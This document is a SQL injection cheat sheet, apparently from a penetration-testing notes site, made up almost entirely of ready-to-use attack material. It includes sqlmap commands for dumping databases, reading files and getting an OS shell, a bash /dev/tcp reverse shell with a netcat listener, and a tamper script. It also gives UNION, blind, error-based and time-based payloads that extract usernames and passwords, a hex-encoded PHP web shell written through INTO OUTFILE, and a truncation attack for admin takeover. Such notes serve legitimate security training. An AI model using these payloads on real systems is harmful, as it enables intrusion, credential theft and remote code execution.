---
title: SQL Injection
description: It is a code injection technique also called as "SQLi".
tags:
    - Database
    - Reverse Shell
    - SQL Injection
    - Web
draft: false
---

## Automation

Sqlmap is an usefule command-line tool for SQL injection automatically.  
You can specify the request settings file which generated in **Burp Suite** by adding the flag **"-r"**.

```sh
sqlmap -r request.txt
sqlmap -r request.txt --dump --dbs --tables --columns --random-agent
sqlmap -r request.txt --dump --dbms mysql --risk 3 --level 5

# --fresh-queries: new data in tables
sqlmap -r request.txt --fresh-queries

# --current-user: Retrieve current user
sqlmap -r request.txt --current-user
# --current-db: Retrieve current DB
sqlamp -r request.txt --current-db

# Specify dabase name, table name, column name
sqlmap -r request.txt -D database_name -T table_name -C column_name
# Specify multiple columns
sqlmap -r request.txt -D database_name -T table_name -C username,password

# --technique=U: UNION attack
# --delay=2: Time Delay
sqlmap -r request.txt --technique=U --delay=2

# --time-sec: Sleep time for Time-Based Blind SQLi
sqlmap -r request.txt --time-sec 2

# --ignore-code: Ignore specific response
sqlmap -r request.txt --ignore-code 401

# --dump-all: Dump all database table entries
sqlmap -r request.txt --dump-all
```

### Basic Commands

```sh
# GET request
sqlmap -u "http://<target-ip>/?search=test"
# -p: target parameter
sqlmap -u "http://<target-ip>/?category=test&item=1" -p item 

# POST request
sqlmap -u "http://<target-ip>" --data="username=test&password=test"
```

### Web Shell

Add option "--os-shell" to interact with web shell.

```sh
sqlmap -u "http://<target-ip>" --cookie="value=*" --os-shell
```

After activating, you may want to upgrade to the full functional shell.  
You can do that using reverse shell.

In your local machine,

```sh
nc -lvnp 4444
```

Then execute the following command in web shell.

```sh
os-shell> bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
```

### Read Files

```sh
# --batch: never ask for user input, use the default behavior
sqlmap -r request.txt --file-read "/var/www/html/index.php" --time-sec 10 --batch
sqlmap -r request.txt --file-read "/var/www/<subdomain>/index.php" --time-sec 10 --batch

sqlmap -u "http://<target-ip>/?q=test" --file-read "var/www/html/index.php" --time-sec 10 --batch
```

### Sqlmap with Tamper

The sqlmap can be tampered by custom python script e.g. tamper.py.

```py
#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://vulnerable.com"
password = "test"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload
```

Then run the sqlmap with the tamper option.

```sh
sqlmap --tamper tamper.py --url http://vulnerable.com/signup --data "username=admin&password=test" --second-url "http://vulnerable.com/post" --no-cast
```

<br />

## Manual Injection

### Comments

```txt
MSSQL       ->  --
MySQL       ->  -- - or #
Oracle      ->  --
PostreSQL   ->  --
```

### Basic Syntax

First off, check if you can insert the SQL commands into the forms or URL params on the target website.

```txt
' OR 1=1--
' OR 1=1-- -
' OR 1=1#

') OR 1=1--
') OR 1=1-- -
') OR 1=1#
```

### Version Detection

- **MSSQL**

    ```html
    ' UNION SELECT @@version--
    ' UNION SELECT NULL,@@version--
    ```

- **MySQL**

    ```html
    ' UNION SELECT @@version-- -
    ' UNION SELECT @@version#

    ' UNION SELECT NULL,@@version-- -
    ' UNION SELECT NULL,@@version#
    ```

- **Oracle**

    ```html
    ' UNION SELECT 'a' FROM dual--
    ' UNION SELECT 'a','b' FROM dual--
    ' UNION SELECT * FROM v$version--
    ' UNION SELECT BANNER,NULL FROM v$version--
    ```

- **PostgreSQL**

    ```html
    ' UNION SELECT version()--
    ' UNION SELECT NULL,version()--
    ```

### Detect the Number of the Columns

The following commands detect the number of the columns in the database.

```html
' UNION SELECT NULL--
' UNION SELECT NULL-- -

' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL-- -

' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL-- -

' UNION SELECT 'a',NULL,NULL--
' UNION SELECT 'a',NULL,NULL-- -

' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,'a',NULL-- -

' UNION SELECT NULL,NULL,'a'--
' UNION SELECT NULL,NULL,'a'-- -

<!-- ALL: Show all records including duplicates -->
' UNION ALL SELECT ...
```

### Detect the Table Name

Get the table name in which you want to get the information.

- **MSSQL**

    ```txt
    ' UNION SELECT table_name,NULL FROM information_schema.tables--
    ```

- **MySQL**

    ```html
    ' UNION SELECT table_name,NULL FROM information_schema.tables-- -
    ' UNION SELECT table_name,NULL FROM information_schema.tables#

    <!-- group_concat(): Dump all tables simultaneously -->
    ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables-- -
    ' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables#
    ```

- **PostgreSQL**

    ```txt
    ' UNION SELECT table_name,NULL FROM information_schema.tables--
    ```

- **Oracle**

    ```txt
    ' UNION SELECT table_name,NULL FROM all_tables--
    ```

### Get the Column Name

Get the column name from the table name you got.

- **MSSQL**

    ```txt
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
    ```

- **MySQL**

    ```txt
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'-- -
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'#
    ```

- **PostgreSQL**

    ```txt
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='table_name'--
    ```

- **Oracle**

    ```txt
    ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='table_name'--
    ```

### Get Information in the Table

Get the desired information in the table.  
For instance, suppose you want to get the username and password from the table named 'users'.

```txt
' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users-- -

' UNION SELECT username || '~' || password FROM users--
' UNION SELECT username || '~' || password FROM users-- -

' UNION SELECT NULL,username || '~' || password FROM users--
' UNION SELECT NULL,username || '~' || password FROM users-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'--
' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'-- -

' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'--
' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'-- -
```

BINARY: Sensitive to upper case and lower case.

```txt
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'--
' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'-- -
```

### Blind SQL

1. **First Check**

    ```txt
    ' AND '1'='1
    ' AND '1'='2
    ' AND (SELECT 'a' FROM users LIMIT 1)='a
    ```

2. **Check if Content Value Exists**

    For example, check if username 'administrator' exists in 'users'

    ```txt
    ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    ```

    If so, determine the password length

    ```txt
    ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
    ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
    ...
    ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
    ```

    Brute force password's character

    ```txt
    ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
    ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
    ...
    ' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$
    ```

### Conditional Error

1. **First Check**

    ```txt
    '
    ''
    '||(SELECT '')||'
    '||(SELECT '' FROM dual)||'
    '||(SELECT '' FROM fake_table)||'
    '||(SELECT '' FROM users WHERE ROWNUM = 1||'
    '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    '|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
    ```

2. **Check if Content Value Exists**

    ```txt
    '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```

    If so, determine the password length

    ```txt
    ''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ...
    ''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```

    Brute force password character

    ```txt
    '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    '||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ...
    '||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```

### Time Delay

1. **First Check**

    - **MySQL**

        ```html
        ' AND sleep(5)-- -
        ```

    - **PostgreSQL**

        ```html
        '||pg_sleep(10)--
        '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        '; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        ```

2. **Check if Content Value Exists**

    ```txt
    '; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    ```

    If so, determine the password length

    ```txt
    '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    ...
    '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    ```

    Brute force password character

    ```txt
    '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    ...
    '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
    ```

<br />

## Write Files

Below are ...

- Writing new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
- Accessing to http://10.0.0.1/shell.php?cmd=whoami

```html
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E-- -
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```

<br />

## Truncation Attack

```sh
# If the table shema is like the following...
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);


# -------------------------------------------------------

# POST request
POST /create-user HTTP/1.1
...

# Create another new "admin" with more than 64 characters. Btw, "+" means the spaces.
username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password
# ---------------------------------------------------------

# Then, login with your new admin credential.
username=admin&password=password

# Or fetch the admin's information.
SELECT * FROM users WHERE username='admin';
# Return the values are the real admin's information.
username = admin
password = <REAL_ADMIN_PASSWORD>
```
